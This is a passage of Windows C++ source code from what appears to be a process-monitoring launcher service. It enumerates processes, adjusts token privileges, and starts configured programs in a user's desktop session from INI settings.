		lbRet = CreateProcessAsUser(lhToken,NULL,szCommandLine,NULL,NULL,FALSE,ldwCreateFlag,NULL,lstrWorkDir,&startUpInfo,&procInfo[0]);

		if (!lbRet)
		{
			lbRet = CreateProcessAsUser(lhToken,NULL,lstrFullPath.GetBuffer(0),NULL,NULL,FALSE,ldwCreateFlag,NULL,lstrWorkDir,&startUpInfo,&procInfo[0]);
		}
		DWORD ldwError = ::GetLastError();

		if (NULL != lhToken)
		{
			try
			{
				CloseHandle(lhToken);

			}catch(...)
			{

			}
		}

		if(NULL != lpEnv)
		{
			DestroyEnvironmentBlock(lpEnv);
		}

		if (!lbRet)
		{
			long nError = GetLastError();

			lbRet = CreateProcess(NULL,szCommandLine,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS,NULL,lstrWorkDir,&startUpInfo,&procInfo[0]);

			if (!lbRet)
			{
				long nError = GetLastError();
			}

			return FALSE;
		}

	}
	else if(!CreateProcess(NULL,szCommandLine,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS,NULL,lstrWorkDir,&startUpInfo,&procInfo[0]))
	{
		long nError = GetLastError();
		return FALSE;
	}

	try
	{

		CloseHandle(procInfo[0].hProcess);

		CloseHandle(procInfo[0].hThread);
	}
	catch (...)
	{

	}

	if (NULL != hCurrentDesktop)
	{
		CloseDesktop(hCurrentDesktop);
	}

	return TRUE;
}




/// calculate days passed since the year 0
int GetDaysSinceAD(int nYear, int nMonth, int nDay)
{
	/// 判断是否闰年
#define IS_LEAP_YEAR(year)		(year%((year%100==0)?400:4)==0)
	/// 平年各月天数
	static const int anDaysOfMonth[] = {0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 303, 334};
	int nTotalDays = nYear*365 + anDaysOfMonth[nMonth-1] + nDay + nYear/4 - nYear/100 + nYear/400;
	if (nMonth>2 && IS_LEAP_YEAR(nYear))
		++nTotalDays;
	return nTotalDays;
}

/// calculate the time difference of two time values, 
int TimeDiffInSec(const SYSTEMTIME &systmSubtractor, const SYSTEMTIME &systmSubtrahend)
{
	int nDiffDays = GetDaysSinceAD(systmSubtractor.wYear, systmSubtractor.wMonth, systmSubtractor.wDay) \
		- GetDaysSinceAD(systmSubtrahend.wYear, systmSubtrahend.wMonth, systmSubtrahend.wDay);
	int nDiffSecs = (systmSubtractor.wHour-systmSubtrahend.wHour)*3600 + (systmSubtractor.wMinute-systmSubtrahend.wMinute)*60 + \
		(systmSubtractor.wSecond-systmSubtrahend.wSecond);
	return nDiffDays*86400+nDiffSecs;
}



BOOL SetPrivilege(
				  HANDLE hToken,          // token handle
				  LPCTSTR Privilege,      // Privilege to enable/disable
				  BOOL bEnablePrivilege   // TRUE to enable.  FALSE to disable
				  )
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	TOKEN_PRIVILEGES tpPrevious;
	DWORD cbPrevious=sizeof(TOKEN_PRIVILEGES);

	if(!LookupPrivilegeValue( NULL, Privilege, &luid )) return FALSE;

	// 
	// first pass.  get current privilege setting
	// 
	tp.PrivilegeCount           = 1;
	tp.Privileges[0].Luid       = luid;
	tp.Privileges[0].Attributes = 0;

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		&tpPrevious,
		&cbPrevious
		);

	if (GetLastError() != ERROR_SUCCESS) return FALSE;

	// 
	// second pass.  set privilege based on previous setting
	// 
	tpPrevious.PrivilegeCount       = 1;
	tpPrevious.Privileges[0].Luid   = luid;

	if(bEnablePrivilege) {
		tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
	}
	else {
		tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tpPrevious.Privileges[0].Attributes);
	}

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tpPrevious,
		cbPrevious,
		NULL,
		NULL
		);

	if (GetLastError() != ERROR_SUCCESS) return FALSE;

	return TRUE;
}


BOOL EnableDebug()
{

	HANDLE hToken = NULL;

	if(!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
	{
		if (GetLastError() == ERROR_NO_TOKEN)
		{
			if (!ImpersonateSelf(SecurityImpersonation))
				return FALSE;

			if(!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
			{

				return FALSE;
			}
		}
		else
		{
			return FALSE;
		}
	}


	HandleWatchDog loWatchDog;
	loWatchDog.SetHandle(hToken);

	if(!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE))
	{
		return FALSE;
	}

	return TRUE;

}



CString GetRemoteCommandLine(HANDLE lhProcess)
{
	USES_CONVERSION_EX;
	CString lstrRet;
	std::vector<WCHAR> loBuffer(10240);
	LPWSTR pszBuffer = & loBuffer.front();
	UINT bufferLength = loBuffer.size()/4*sizeof(WCHAR);


	DWORD ldwRet = GetRemoteCommandLineW(lhProcess,pszBuffer,bufferLength);
	if (ldwRet>sizeof(WCHAR))
	{	 lstrRet = W2T_EX(pszBuffer,ldwRet/sizeof(WCHAR));	
	}
	return lstrRet;
}
// helper functions

CString ExeCmd(CString astrCMD,int anSleepTime)
{
	
	USES_CONVERSION;
	// 创建匿名管道
	SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
	HANDLE hRead = NULL, hWrite = NULL;
	HandleWatchDog loRead,loWrite;
	loRead.SetHandle(hRead);loWrite.SetHandle(hWrite);
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		return (" ");
	}

	// 设置命令行进程启动信息(以隐藏方式启动命令并定位其输出到hWrite
	STARTUPINFO si = {sizeof(STARTUPINFO)};
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;

	// 启动命令行
	PROCESS_INFORMATION pi;
	if (!CreateProcess(NULL, astrCMD.GetBuffer(0), NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
	{
		
		return ("Cannot create process");
	}

	HandleWatchDog loProcess;
	loProcess.SetHandle(pi.hProcess);

	HandleWatchDog loThread;
	loThread.SetHandle(pi.hThread);

	Sleep(anSleepTime);
	// 立即关闭hWrite
	CloseHandle(hWrite);
	loWrite.SetEnableAutoCloseHandle(FALSE);


	// 读取命令行返回值
	std::string strRetTmp;
	char buff[40960] = {0};
	DWORD dwRead = 0;
	strRetTmp = buff;
	while (ReadFile(hRead, buff, 40950, &dwRead, NULL))
	{
		strRetTmp += buff;
		ZeroMemory(buff,sizeof(buff));
	}
	CloseHandle(hRead);
	loRead.SetEnableAutoCloseHandle(FALSE);
	
	CString lstrRet = strRetTmp.c_str();

	return lstrRet;
}


CString getProcessWorkingDirectory(int anProcessID)
{
	CString lstrCMD;
	CString lstrCurrentProcessDirectory;
	::GetCurrentDirectory(1024,lstrCurrentProcessDirectory.GetBuffer(10240));
	lstrCurrentProcessDirectory.ReleaseBuffer();
	lstrCMD.Format("%s\\handle.exe -p %d",lstrCurrentProcessDirectory.GetBuffer(0),anProcessID);
	CString lstrDirectoryPath = ExeCmd(lstrCMD,1);
//	OutputDebugString(lstrDirectoryPath);

	std::istringstream f(lstrDirectoryPath.GetBuffer(0));
	std::string line;    
	while (std::getline(f, line)) 
	{
	  CString lstrLine = line.c_str();
	  lstrLine = lstrLine.MakeLower();
	  if(lstrLine.Find("c:\\windows")>=0)
	  {
		  continue;
	  }
	  if(lstrLine.Find("file")>=0)
	  {
		 int lnIndex = lstrLine.Find('\\');
		 lnIndex = lnIndex-3;
		 if(lnIndex>=0)
		 {
			 lstrDirectoryPath = lstrLine.Mid(lnIndex+1,lstrLine.GetLength()-lnIndex);
			 lstrDirectoryPath.Replace('\r',' ');
			 lstrDirectoryPath.Replace('\n',' ');
			 lstrDirectoryPath = lstrDirectoryPath.Trim();
			
		 }
		 break;
	  }
	}

	return lstrDirectoryPath;
}
CString CheckAndAppendDirectorySymbol(CString astrDirectory)
{

	int lnIndex = astrDirectory.ReverseFind('\\');
	if(lnIndex!=astrDirectory.GetLength()-1)
	{
		astrDirectory.Append("\\");
	}
	return astrDirectory;
}
/// find all process instances of one specific executable file
BOOL FindProcess(int nIndex,ProcessQuerytor & arefQuery)
{

	/* work flow:
	1 enumerate all running processes' id
	2 for each process id: 
	2.1 get its process handle
	2.2 get its module handle
	2.3 get its module name
	2.4 compare the module name with the executable file name: if equals, then record the process id and handle
	*/
	if (nIndex<0 || nIndex>=nProcCount)
	{
		return FALSE;
	}

	char szModule[MAX_PATH] = "";
	char szTmp[MAX_PATH] = "";
	DWORD dwNeededSize = 0;
	DWORD adwProcessId[c_nMaxSize];
	HMODULE ahMod[c_nMaxSize];
	::memset(adwProcessId, 0, sizeof(adwProcessId));
	::memset(ahMod, 0, sizeof(ahMod));
	pProcess[nIndex].nInstCount = 0;

	PSYSTEM_PROCESS_INFORMATION_DETAILD loInfo = NULL;

	/*if(!UnDocumentedEnumAllProcess(loInfo))
	{
		FreeUnDocumentedEnumAllProcess(loInfo);
	}*/

	// 1
	if (!::EnumProcesses(adwProcessId, sizeof(adwProcessId), &dwNeededSize))
	{
		WriteLog(pLogFile, "Process enumeration failed.", TRUE);

		return FALSE;
	}


	// 2
	int nTotal = dwNeededSize/sizeof(DWORD);

	if (nTotal > c_nMaxSize)
	{
		nTotal = c_nMaxSize;
	}

	for (int i = 0; i < nTotal; i++)
	{
		DWORD ldwProcessID = adwProcessId[i];

#ifdef _DEBUG
		CString lstrLog;
		lstrLog.Format("Process:%d",ldwProcessID);
		OutputDebugString(lstrLog+"\r\n");
#endif // _DEBUG
		// 2.1
		HANDLE hProcess = ::OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_TERMINATE, FALSE, ldwProcessID);

		if (INVALID_HANDLE_VALUE == hProcess || NULL == hProcess)
		{
			EnableDebug();

			hProcess = ::OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_TERMINATE, FALSE, ldwProcessID);

		}

		HandleWatchDog loWatchDog;

		loWatchDog.SetHandle(hProcess);

		if (!hProcess)
		{
			continue;
		}

		dwNeededSize = 0;

		CString lstrszModule ;
		CString lstrszModuleName = pProcess[nIndex].szRealProcessName;
		CString lstrDirectory = pProcess[nIndex].szDirectory;
		lstrDirectory = lstrDirectory.MakeLower();
		CString lstrCommandLine ;
		// 2.2
		if (!::EnumProcessModules(hProcess, ahMod, sizeof(ahMod), &dwNeededSize) && dwNeededSize ==0)
		{
			//lstrszModule = UnDocumentedGetProcessName(ldwProcessID,loInfo);

			lstrszModule = GetNameFromComX(ldwProcessID,arefQuery,lstrCommandLine);

			if(lstrszModule.MakeLower().Find("java")>0)
			{
				printf(lstrszModule.GetBuffer(0));
			}

			if(lstrszModule.IsEmpty())
			{
				continue;
			}

		}else
		{
			// 2.3
			::GetModuleFileNameEx(hProcess, ahMod[0], szModule, MAX_PATH-1);			
			// 2.4
			lstrszModule = szModule;	

			lstrszModule = GetNameFromComX(ldwProcessID,arefQuery,lstrCommandLine);

			if(lstrszModule.MakeLower().Find("java")>0)
			{
				printf(lstrszModule.GetBuffer(0));
			}
		}

		if (lstrszModuleName.Find(lstrszModule)==0 || (lstrszModuleName.Find(lstrCommandLine) ==0 && lstrCommandLine.GetLength()>0))
		{

			if(strlen(pProcess[nIndex].szRealProcessName) == 0)
			{
				continue;
			}

			if(lstrDirectory.GetLength()>0)
			{

				CString lstrCurrentProcessDirectory = getProcessWorkingDirectory(ldwProcessID);
				lstrCurrentProcessDirectory = lstrCurrentProcessDirectory.MakeLower();
				if(lstrCurrentProcessDirectory.Find('\\')>=0)
				{
					lstrCurrentProcessDirectory = CheckAndAppendDirectorySymbol(lstrCurrentProcessDirectory);
					lstrDirectory = CheckAndAppendDirectorySymbol(lstrDirectory);
					if(lstrCurrentProcessDirectory.GetLength()>0)
					{
						if(lstrDirectory.CompareNoCase(lstrCurrentProcessDirectory)!=0)
						{
							continue;
						}
					}

				}
			}

			try
			{
				if (pProcess[nIndex].procInfo[pProcess[nIndex].nInstCount].hThread!=NULL)
				{
					CloseHandle(pProcess[nIndex].procInfo[pProcess[nIndex].nInstCount].hThread);
					pProcess[nIndex].procInfo[pProcess[nIndex].nInstCount].hThread = NULL;
				}

			}catch(...)
			{

			}

			try
			{
				if (pProcess[nIndex].procInfo[pProcess[nIndex].nInstCount].hProcess!=NULL)
				{
					CloseHandle(pProcess[nIndex].procInfo[pProcess[nIndex].nInstCount].hProcess);
					pProcess[nIndex].procInfo[pProcess[nIndex].nInstCount].hProcess = NULL;
				}


			}catch(...)
			{

			}
			pProcess[nIndex].procInfo[pProcess[nIndex].nInstCount].hProcess = hProcess;
			pProcess[nIndex].procInfo[pProcess[nIndex].nInstCount].dwProcessId = adwProcessId[i];
			++pProcess[nIndex].nInstCount;
			loWatchDog.SetEnableAutoCloseHandle(FALSE);
		}
		
		if(lstrszModule.MakeLower().Find("java")>0)
		{
			printf(lstrszModule.GetBuffer(0));
		}
		
	}

	
	::sprintf(szTmp, "Instance count of process %d is %d", nIndex, pProcess[nIndex].nInstCount);
	WriteLog(pLogFile, szTmp, TRUE);
	//FreeUnDocumentedEnumAllProcess(loInfo);
	return (pProcess[nIndex].nInstCount>0);
}



DWORD GetCurrentLogonUserSessionID(int anIndex)
{
	int lnDataCount = 0;

	PWTS_SESSION_INFOA  lpSessionInfo = NULL;

	DWORD ldwCount = 0;

	INT ldwSessionID = -1;

	BOOL lbRet = WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE,0,1,&lpSessionInfo,&ldwCount);

	char szTmp[c_nMaxSize] = "";

	char szItem[c_nMaxSize] = "";

	sprintf(szItem, "Process%d", anIndex);

	int lnDesiredSessionId = GetPrivateProfileInt(szItem,"DST_SESSION_ID",-1,pInitFile);

	int lnStandById = -1;

	if (lbRet)
	{
		if (lnDesiredSessionId>=0)
		{
			for (UINT i =0;i<ldwCount;i++)
			{

				WTS_SESSION_INFO si = lpSessionInfo[i];

				if (((WTSActive == si.State) || (WTSDisconnected == si.State)))
				{
					lnStandById = si.SessionId;
					if (( si.SessionId == lnDesiredSessionId))
					{
						ldwSessionID = si.SessionId;
						break;
					}
				}


			}
		}else
		{
			CString lstrName;
			for (UINT i =0;i<ldwCount;i++)
			{
				lstrName = lpSessionInfo[i].pWinStationName;
				TRACE(_T("%s : %d \r\n"),lpSessionInfo[i].pWinStationName,lpSessionInfo[i].SessionId);	

				if ((WTSActive == lpSessionInfo[i].State) && lstrName.CompareNoCase("Services")!=0)
				{
					ldwSessionID = lpSessionInfo[i].SessionId;

					break;
				}			
			}

			for (UINT i =0;i<ldwCount;i++)
			{
				lstrName = lpSessionInfo[i].pWinStationName;
				TRACE(_T("%s : %d \r\n"),lpSessionInfo[i].pWinStationName,lpSessionInfo[i].SessionId);	

				if ((WTSDisconnected == lpSessionInfo[i].State)&& lstrName.CompareNoCase("Services")!=0)
				{
					ldwSessionID = lpSessionInfo[i].SessionId;

					break;
				}			
			}

		}


		if (lpSessionInfo!=NULL)
		{
			WTSFreeMemory(lpSessionInfo);

			lpSessionInfo = NULL;

		}
	}
	if (ldwSessionID<0)
	{
		if (lnStandById<0)
		{
			ldwSessionID = WTSGetActiveConsoleSessionId();
		}else
		{
			ldwSessionID = lnStandById;
		}

	}

	return ldwSessionID;
}

#include "Session.h"
int GetSessionId()
{
	PWTS_SESSION_INFO pSessionInfo(NULL);
	DWORD count(0);
	if(!WTSEnumerateSessions( WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &count))
	{
		DWORD err = GetLastError();

		return -1;
	}
	wts_resource<WTS_SESSION_INFO> wtsSessionInfo(pSessionInfo);

	int lnSid = -1;

	int lnDisConnectedId = -1;

	for (DWORD i = 0; i < count; ++i)
	{
		int sid = wtsSessionInfo.get()[i].SessionId;	
		DWORD bytesReturned(0);
		LPTSTR pBuf(NULL);

		if(!WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, sid, WTSConnectState, &pBuf, &bytesReturned))
		{
			continue;
		}
		wts_resource<TCHAR> wtsPBuf(pBuf);
		int connectState = *(reinterpret_cast<int*> (wtsPBuf.get()));

		if ((connectState == WTSActive))
		{
			if (lnSid<=0)
			{
				lnSid = sid;
				break;
			}			
		}

		if ((connectState == WTSDisconnected))
		{
			if (lnSid<=0)
			{
				lnDisConnectedId = sid;

			}			
		}
	}

	if (lnSid==-1)
	{
		lnSid = lnDisConnectedId;
	}
	return lnSid;
}

BOOL StartProcessInAnotherSession(LPCWSTR lpUsername,
								  LPCWSTR lpDomain,
								  LPCWSTR lpPassword,
								  DWORD   dwLogonFlags,
								  LPCWSTR lpApplicationName,
								  LPWSTR lpCommandLine,
								  DWORD dwCreationFlags,
								  LPVOID lpEnvironment,
								  LPCWSTR lpCurrentDirectory,
								  LPSTARTUPINFOW lpStartupInfo,
								  LPPROCESS_INFORMATION lpProcessInformation,
								  LPCTSTR lpFileName,
								  LPCTSTR lpSenctionName)
{

	USES_CONVERSION;
	CString lstrLoader = _T("TrayRefresher.exe");
	CString lstrCheck = W2T(lpCommandLine);
	if (lstrCheck.Find(lstrLoader)>=0)
	{
		return FALSE;
	}
	BOOL lbRet =GetSpecPrivilege(SE_DEBUG_NAME);
	lbRet = GetSpecPrivilege(SE_TCB_NAME );
	HANDLE lhToken = NULL;
	HandleWatchDog loWatchDog;

	int lnSid = GetSessionId();

	if (lnSid>=0)
	{
		lbRet = WTSQueryUserToken (lnSid, &lhToken); 
	}else
	{
		lbRet = WTSQueryUserToken (WTSGetActiveConsoleSessionId(), &lhToken); 
	}

	DWORD ldwErroCode =0;

	if (!lbRet)
	{
		ldwErroCode = GetLastError();		 
	}

	if (NULL!= lhToken)
	{
		loWatchDog.SetHandle(lhToken);
	}


	if (lbRet)
	{	   
		lpStartupInfo->wShowWindow = SW_HIDE;
		lpCurrentDirectory = T2W(GetAppPath());
		CString lstrCommand;
		lstrCommand.Format(_T("%s/%s /f%s /s%s"),W2T(lpCurrentDirectory),lstrLoader,lpFileName,lpSenctionName);
		lbRet = CreateProcessAsUserW( lhToken,
			NULL,
			T2W(lstrCommand),
			NULL,
			NULL,
			FALSE,
			dwCreationFlags,
			NULL,
			lpCurrentDirectory,
			lpStartupInfo,
			lpProcessInformation);


		if (!lbRet)
		{
			ldwErroCode = GetLastError();

			if (ldwErroCode ==2)
			{
				lstrCommand.Format(_T("%s /f%s /s%s"),lstrLoader,lpFileName,lpSenctionName);
				lbRet = CreateProcessAsUserW( lhToken,
					NULL,
					T2W(lstrCommand),
					NULL,
					NULL,
					FALSE,
					dwCreationFlags,
					NULL,
					lpCurrentDirectory,
					lpStartupInfo,
					lpProcessInformation);
			}
		}else
		{
			DWORD ldwCreate =  WaitForSingleObject(lpProcessInformation->hProcess,-1);
			if (ldwCreate == 0x00000000L)
			{

				::GetExitCodeProcess(lpProcessInformation->hProcess,(DWORD *)&lbRet);
			}
		}
	}

	return lbRet;
}

BOOL StartProcess(int nIndex,ProcessQuerytor & arefQuery) 
{
	USES_CONVERSION;

	if (nIndex<0 || nIndex>=nProcCount)
	{
		return FALSE;
	}
	// start a process with given index

	BOOL lbUseCurrentUserDesktop = FALSE;

	HANDLE lhToken = NULL;
	HANDLE lhTokenDuplicated = NULL;
	DWORD ldwErrorCode = 0;

	LPVOID lpEnv = NULL;

	char szCommandLine[c_nMaxSize] = "";

	char szRealProcessName[c_nMaxSize] = "";

	char CurrentDesktopName[c_nMaxSize] = "";

	char szWorkingDirectory[c_nMaxSize] = "";

	char szTitle[c_nMaxSize] = "";

	char szTmp[c_nMaxSize] = "";

	char szItem[c_nMaxSize] = "";

	HDESK hCurrentDesktop = NULL;

	sprintf(szItem, "Process%d", nIndex);

	::GetPrivateProfileString(szItem, "CommandLine", "", szCommandLine, c_nMaxSize, pInitFile);

	::GetPrivateProfileString(szItem, "WorkingDir", "", szWorkingDirectory, c_nMaxSize, pInitFile);

	::GetPrivateProfileString(szItem, "RealProcessName", "", szRealProcessName, c_nMaxSize, pInitFile);

	::GetPrivateProfileString(szItem, "Title", "", szTitle, c_nMaxSize, pInitFile);

	STARTUPINFO startUpInfo = { sizeof(STARTUPINFO),NULL,"",NULL,0,0,0,0,0,0,0,STARTF_USESHOWWINDOW,0,0,NULL,0,0,0}; 
	STARTUPINFOW startUpInfow = { sizeof(STARTUPINFOW),NULL,A2W(""),NULL,0,0,0,0,0,0,0,STARTF_USESHOWWINDOW,0,0,NULL,0,0,0}; 

	if(strlen(szTitle)!=0)
	{
		startUpInfo.lpTitle = szTitle;
		startUpInfow.lpTitle = A2W(szTitle);
	}


	if(strlen(szRealProcessName) ==0)
	{
		::strcpy(pProcess[nIndex].szRealProcessName, szCommandLine);
		::strcpy(szRealProcessName, pProcess[nIndex].szRealProcessName);
		//::WritePrivateProfileString(szItem, "RealProcessName", szCommandLine, pInitFile);

	}else
	{
		::strcpy(pProcess[nIndex].szRealProcessName, szRealProcessName);
	}   

	::strcpy(pProcess[nIndex].szDirectory, szWorkingDirectory);

	if(strlen(szRealProcessName) ==0)
	{
		return FALSE;
	}

	::strcpy(pProcess[nIndex].szModuleName, szCommandLine);

	int lbHide = ::GetPrivateProfileInt(szItem, "Hide", 0, pInitFile);

	int lnShowMode = SW_SHOW;

	if (lbHide)
	{
		lnShowMode = SW_HIDE;
	}



	BOOL bUserInterface = ::GetPrivateProfileInt(szItem, "UserInterface", 1, pInitFile);
	// find if there already exits the same process
	if (FindProcess(nIndex,arefQuery))
	{
		::sprintf(szTmp, "process %d is running!", nIndex);
		WriteLog(pLogFile, szTmp, TRUE);
		return TRUE;
	}

	CString lstrUserName ;
	CString lstrPassWord ;
	CString lstrDomain;


	RefreshTray(nIndex);
	// set the correct desktop for the process to be started
	DWORD  ldwCreateFlag = NORMAL_PRIORITY_CLASS;
judge_interface_mode:
	if(bUserInterface)
	{
		if (2 == bUserInterface)
		{

			DWORD ldwActiveSessionId = GetCurrentLogonUserSessionID(nIndex);

			if (-1 != ldwActiveSessionId)
			{
				BOOL lbRet = GetCurrentUserToken(lhToken,nIndex);

				if (!lbRet)
				{
					HANDLE hToken = NULL;

					if(OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
					{
						HandleWatchDog loWatchDog;
						loWatchDog.SetHandle(hToken);

						if(SetPrivilege(hToken, SE_DEBUG_NAME, TRUE))
						{
							lbRet = GetCurrentUserToken(lhToken,nIndex);
							//SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);
						}
					}
				}

				if (lbRet)
				{
					lbUseCurrentUserDesktop = TRUE;

					ldwCreateFlag = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE|CREATE_UNICODE_ENVIRONMENT;

					if (CreateEnvironmentBlock(&lpEnv, lhToken, FALSE))
					{
						lbUseCurrentUserDesktop = TRUE;

					}else
					{
						lbUseCurrentUserDesktop = FALSE;

					}

				}
			}

			if (lbUseCurrentUserDesktop)
			{
				startUpInfo.wShowWindow = lnShowMode;			
				startUpInfo.lpDesktop = "WinSta0\\default";

				startUpInfow.wShowWindow = lnShowMode;			
				startUpInfow.lpDesktop = A2W("WinSta0\\default");
			}else
			{
				startUpInfo.wShowWindow = lnShowMode;
				startUpInfo.lpDesktop = NULL;

				startUpInfow.wShowWindow = lnShowMode;			
				startUpInfow.lpDesktop = NULL;
			}
		}
		else if (3 == bUserInterface)
		{

			int lnBufferLength = 1024;
			::GetPrivateProfileString(  szItem, 
				"Username",
				"",lstrUserName.GetBufferSetLength(lnBufferLength),
				lnBufferLength, 
				pInitFile);
			lstrUserName.ReleaseBuffer();


			::GetPrivateProfileString(  szItem, 
				"Password",
				"",lstrPassWord.GetBufferSetLength(lnBufferLength),
				lnBufferLength, 
				pInitFile);

			lstrPassWord.ReleaseBuffer();

			::GetPrivateProfileString(  szItem, 
				"Domain",
				"",lstrDomain.GetBufferSetLength(lnBufferLength),
				lnBufferLength, 
				pInitFile);				

			lstrDomain.ReleaseBuffer();

			if (LogonUser(lstrUserName.GetBuffer(),
				lstrDomain.GetBuffer(),
				lstrPassWord.GetBuffer(),
				LOGON32_LOGON_INTERACTIVE,
				LOGON32_PROVIDER_DEFAULT,
				&lhToken
				))
			{
				PROFILEINFO piLoad = {0};
				DWORD dwSize = 0;
				TCHAR szUserProfile[2048] = _T("");
				DWORD rc = 0;
				if (NULL!=lhToken)
				{
					if (DuplicateTokenEx(   lhToken,
						MAXIMUM_ALLOWED,
						NULL,
						SecurityImpersonation,
						TokenPrimary,
						& lhTokenDuplicated))
					{


						dwSize = sizeof(szUserProfile)/sizeof(szUserProfile[0]);

						if (GetUserProfileDirectory(lhTokenDuplicated, szUserProfile, &dwSize)) 
						{

							piLoad.dwSize = sizeof(piLoad);
							piLoad.dwFlags = PI_NOUI;
							piLoad.lpUserName = lstrUserName.GetBuffer(0);
							piLoad.lpProfilePath = szUserProfile;
							if (!LoadUserProfile(lhTokenDuplicated, &piLoad)) 
							{
								ldwErrorCode = ::GetLastError();			
							}else
							{
								lbUseCurrentUserDesktop = TRUE;

								ldwCreateFlag = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE|CREATE_UNICODE_ENVIRONMENT;

								if (CreateEnvironmentBlock(&lpEnv, lhTokenDuplicated, FALSE))
								{

									lbUseCurrentUserDesktop = TRUE;

								}else
								{
									lbUseCurrentUserDesktop = FALSE;

								}
							}//if (!LoadUserProfile(lhTokenDuplicated, &piLoad))

						}//if (GetUserProfileDirectory(lhTokenDuplicated, szUserProfile, &dwSize)) 
						else
						{	
							ldwErrorCode = ::GetLastError();
						}
					}else
					{
						ldwErrorCode = ::GetLastError();
					}//if (DuplicateToken(lhToken, SecurityImpersonation,& lhTokenDuplicated))

				}else
				{
					ldwErrorCode = ::GetLastError();
				}//if (NULL!=lhToken)
			}else
			{
				ldwErrorCode = ::GetLastError();
				bUserInterface = 2;
				goto judge_interface_mode;
			}//if (LogonUser(lstrUserName.GetBuffer(),


			if (lbUseCurrentUserDesktop)
			{

				startUpInfo.wShowWindow = lnShowMode;
				startUpInfo.lpDesktop = NULL;

				startUpInfow.wShowWindow = startUpInfo.wShowWindow;			
				startUpInfow.lpDesktop = NULL;
			}else
			{
				startUpInfo.wShowWindow = lnShowMode;
				startUpInfo.lpDesktop = NULL;

				startUpInfow.wShowWindow = startUpInfo.wShowWindow;			
				startUpInfow.lpDesktop = NULL;
			}

		}
		else
		{
			startUpInfo.wShowWindow = lnShowMode;
			startUpInfo.lpDesktop = NULL;
			ldwErrorCode = ::GetLastError();
		}
	}
	else
	{
		hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
		DWORD len;
		::GetUserObjectInformation(hCurrentDesktop,UOI_NAME,CurrentDesktopName,MAX_PATH,&len);
		startUpInfo.wShowWindow = lnShowMode;
		startUpInfo.lpDesktop = CurrentDesktopName;		

	}

	// create the process
	char pWorkingDir[c_nMaxSize] = "";
	unsigned int nPauseSec = 1;

	::GetPrivateProfileString(szItem, "WorkingDir", "", pWorkingDir, c_nMaxSize, pInitFile);

	if (strlen(pWorkingDir) == 0)
	{
		CString lstrWorkDir = pProcess[nIndex].szModuleName;

		lstrWorkDir.Replace(_T('/'),_T('\\'));

		int lnIndex = lstrWorkDir.ReverseFind(_T('\\'));

		if (lnIndex >0)
		{
			lstrWorkDir = lstrWorkDir.Mid(0,lnIndex);

			strcpy(pWorkingDir,lstrWorkDir);
		}
	}

	nPauseSec = ::GetPrivateProfileInt(szItem, "PauseStart", 5, pInitFile);

	::Sleep(nPauseSec * CLOCKS_PER_SEC);

	for (int i=0;i<pProcess[nIndex].m_nProcInfoCount;i++)
	{
		try
		{
			if (pProcess[nIndex].procInfo[i].dwProcessId ==0)
			{
				continue;
			}
			if (pProcess[nIndex].procInfo[i].hThread!=NULL)
			{
				CloseHandle(pProcess[nIndex].procInfo[i].hThread);
				pProcess[nIndex].procInfo[i].hThread = NULL;
			}

		}catch(...)
		{

		}

		try
		{
			if (pProcess[nIndex].procInfo[i].hProcess!=NULL)
			{
				CloseHandle(pProcess[nIndex].procInfo[i].hProcess);
				pProcess[nIndex].procInfo[i].hProcess = NULL;
			}


		}catch(...)
		{

		}
	}




	if (lbUseCurrentUserDesktop)
	{
		BOOL lbRet = FALSE;

		if (3==bUserInterface)
		{
			lbRet = StartProcessInAnotherSession(
				T2W(lstrUserName),
				T2W(lstrDomain),
				T2W(lstrPassWord),
				LOGON_WITH_PROFILE,
				NULL,
				A2W(szCommandLine),
				ldwCreateFlag,
				NULL,
				A2W(pWorkingDir),
				&startUpInfow,
				&(pProcess[nIndex].procInfo[0]),
				pInitFile,
				szItem);

			if (!lbRet)
			{
				lbRet = CreateProcessAsUser(lhTokenDuplicated,
					NULL,
					szCommandLine,
					NULL,
					NULL,
					FALSE,
					ldwCreateFlag,
					NULL,
					pWorkingDir,
					&startUpInfo,
					&(pProcess[nIndex].procInfo[0]));
			}


			if (!lbRet)
			{

				ldwErrorCode = ::GetLastError();

				lbRet = CreateProcessWithLogonW(
					T2W(lstrUserName),
					T2W(lstrDomain),
					T2W(lstrPassWord),
					LOGON_WITH_PROFILE,
					NULL,
					A2W(szCommandLine),
					ldwCreateFlag,
					NULL,
					A2W(pWorkingDir),
					&startUpInfow,
					&(pProcess[nIndex].procInfo[0]));

				if (!lbRet)
				{
					ldwErrorCode = ::GetLastError();
				}
			}

			if (lbRet)
			{
				CString lstrLog;
